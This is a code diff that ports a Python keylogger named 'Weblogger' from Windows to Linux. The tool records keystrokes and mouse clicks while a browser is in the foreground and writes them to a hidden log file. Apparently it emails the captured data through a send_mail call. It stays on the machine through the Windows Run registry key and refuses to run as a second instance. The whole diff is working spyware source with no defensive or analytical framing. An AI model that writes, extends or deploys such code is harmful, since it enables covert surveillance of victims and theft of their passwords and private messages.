@@ -1,16 +1,20 @@
 # -*- coding: utf-8 -*-
 
-from win32gui import GetWindowText, GetForegroundWindow
 from time import sleep
 from pynput.keyboard import Key, Listener
 from pynput.mouse import Button, Listener as mouseListener
 import os
+import sys
 import re
+import fcntl
 import signal
 import subprocess
-import win32event
-import win32api
-import winerror
+
+if 'win' in sys.platform:
+    import win32gui
+    import win32event
+    import win32api
+    import winerror
 
 
 class Weblogger(object):
@@ -24,8 +28,8 @@ class Weblogger(object):
                    Key.esc, Key.home, Key.end]
 
     def __init__(self, email_to=""):
-        self.log_file = os.path.join(os.environ['userprofile'], 'log.txt')
         self.email_to = email_to
+        self.log_file = ""
         self.w_name = ""
         self.w_title = ""
         self.browser_title = ""
@@ -34,9 +38,19 @@ class Weblogger(object):
         self.is_thread_running = False
         self.last_key = None
 
+        self.get_log_file()
         self.create_file()
 
-        subprocess.call('attrib +h ' + self.log_file, shell=True)
+    def get_log_file(self):
+        if 'linux' in sys.platform:
+            self.log_file = os.path.join(os.environ['HOME'], '.log.txt')
+        elif 'win' in sys.platform:
+            self.log_file = os.path.join(os.environ['userprofile'], 'log.txt')
+            subprocess.call('attrib +h ' + self.log_file, shell=True)
+        else:
+            if self.LOGGING:
+                print("%s platform not supported yet." % sys.platform.capitalize())
+            exit(1)
 
     def create_file(self):
         if not os.path.exists(self.log_file):
@@ -51,9 +65,7 @@ class Weblogger(object):
             os.remove(self.log_file)
 
     def is_browser_open(self, update_titles=True):
-        window = GetWindowText(GetForegroundWindow())
-        self.w_name = window.split(' - ')[-1]
-        self.w_title = ' - '.join(window.split(' - ')[:-1])
+        self.w_name, self.w_title = self.get_window_name()
 
         if self.w_name.lower() in self.BROWSERS:
             if update_titles:
@@ -196,6 +208,32 @@ class Weblogger(object):
             self.send_mail(data)
 
     @staticmethod
+    def get_window_name():
+        curr_window = ''
+
+        if 'linux' in sys.platform:
+            root = subprocess.Popen(['xprop', '-root', '_NET_ACTIVE_WINDOW'], stdout=subprocess.PIPE)
+            stdout, stderr = root.communicate()
+
+            m = re.search(r'^_NET_ACTIVE_WINDOW.* ([\w]+)$', stdout)
+            if m is not None:
+                window_id = m.group(1)
+                window = subprocess.Popen(['xprop', '-id', window_id, 'WM_NAME'], stdout=subprocess.PIPE)
+                stdout, stderr = window.communicate()
+            else:
+                return '', ''
+
+            match = re.match(r"WM_NAME\(\w+\) = (?P<name>.+)$", stdout)
+            if match is not None:
+                curr_window = match.group("name").strip('"')
+            else:
+                return '', ''
+        elif 'win' in sys.platform:
+            curr_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+        return curr_window.split(' - ')[-1], ' - '.join(curr_window.split(' - ')[:-1])
+
+    @staticmethod
     def get_pressed_key(key):
         str_key = str(key)
 
@@ -262,22 +300,47 @@ class Weblogger(object):
 
     @staticmethod
     def startup(action):
-        from _winreg import OpenKey, SetValueEx, DeleteValue, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
+        # Only for windows
+        if 'win' in sys.platform:
+            import _winreg
 
-        file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), os.path.basename(__file__))
-        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
-        reg_name = "Weblogger"
+            file_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), os.path.basename(__file__))
+            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
+            reg_name = "Weblogger"
 
-        key2change = OpenKey(HKEY_CURRENT_USER, key_path, 0, KEY_ALL_ACCESS)
+            key2change = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key_path, 0, _winreg.KEY_ALL_ACCESS)
 
-        if action == 'add':
-            SetValueEx(key2change, reg_name, 0, REG_SZ, file_path)
-        elif action == 'del':
-            DeleteValue(key2change, reg_name)
+            if action == 'add':
+                _winreg.SetValueEx(key2change, reg_name, 0, _winreg.REG_SZ, file_path)
+            elif action == 'del':
+                _winreg.DeleteValue(key2change, reg_name)
 
 
-if __name__ == '__main__':
-    wl = Weblogger(email_to="")
+def create_lock():
+    _lock = None
+    already_running = False
+
+    if 'win' in sys.platform:
+        mutex = win32event.CreateMutex(None, 1, 'weblogger_mutex')
+        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+            mutex = None
+            already_running = True
+    else:
+        _lock = open(os.path.realpath(__file__), 'r')
+        try:
+            fcntl.flock(_lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
+        except IOError:
+            already_running = True
+
+    if already_running:
+        if wl.LOGGING:
+            print "Multiple Instances not Allowed"
+        exit(0)
+    else:
+        return _lock
+
+
+def trap_signals():
     signal.signal(signal.SIGTERM, wl.kill)
     signal.signal(signal.SIGINT, wl.kill)
     signal.signal(signal.SIGILL, wl.kill)
@@ -285,12 +348,12 @@ if __name__ == '__main__':
     signal.signal(signal.SIGFPE, wl.kill)
     signal.signal(signal.SIGSEGV, wl.kill)
 
-    mutex = win32event.CreateMutex(None, 1, 'weblogger_mutex')
-    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-        mutex = None
-        if wl.LOGGING:
-            print "Multiple Instance not Allowed"
-        exit(0)
+
+if __name__ == '__main__':
+    wl = Weblogger(email_to="")
+
+    lock = create_lock()
+    trap_signals()
 
     while True:
         if wl.is_browser_open(update_titles=False) and not wl.is_thread_running:
